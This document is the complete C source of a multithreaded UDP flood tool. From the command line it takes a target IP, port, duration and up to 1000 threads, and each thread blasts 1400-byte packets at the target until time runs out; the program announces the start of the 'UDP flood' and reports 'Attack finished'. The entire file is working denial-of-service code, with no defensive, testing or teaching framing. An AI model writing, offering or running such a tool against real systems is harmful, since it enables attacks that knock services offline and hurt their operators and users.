#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define PACKET_SIZE 1400  
#define MAX_THREADS 1000 

typedef struct {
    char target[256];
    int port;
    int duration;
    int threads;
} flood_args_t;

void *udp_flood(void *arg) {
    flood_args_t *args = (flood_args_t *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &addr.sin_addr);

    char *packet = malloc(PACKET_SIZE);
    if (!packet) {
        perror("malloc");
        close(sock);
        pthread_exit(NULL);
    }
    memset(packet, 'A', PACKET_SIZE); 

    time_t end = time(NULL) + args->duration;
    size_t sent_bytes = 0;

    while (time(NULL) < end) {
        ssize_t sent = sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&addr, sizeof(addr));
        if (sent < 0) {
            perror("sendto");
            break;
        }
        sent_bytes += sent;
    }

    free(packet);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <target_ip> <port> <duration_seconds> <threads>\n", argv[0]);
        return 1;
    }

    flood_args_t args;
    strncpy(args.target, argv[1], sizeof(args.target));
    args.port = atoi(argv[2]);
    args.duration = atoi(argv[3]);
    args.threads = atoi(argv[4]);
    if (args.threads > MAX_THREADS) args.threads = MAX_THREADS;

    pthread_t *tids = malloc(sizeof(pthread_t) * args.threads);
    if (!tids) {
        perror("malloc");
        return 1;
    }

    srand(time(NULL));

    printf("[*] Starting UDP flood on %s:%d with %d threads for %d seconds\n",
           args.target, args.port, args.threads, args.duration);

    for (int i = 0; i < args.threads; i++) {
        pthread_create(&tids[i], NULL, udp_flood, &args);
    }

    for (int i = 0; i < args.threads; i++) {
        pthread_join(tids[i], NULL);
    }

    free(tids);
    printf("[*] Attack finished\n");
    return 0;
}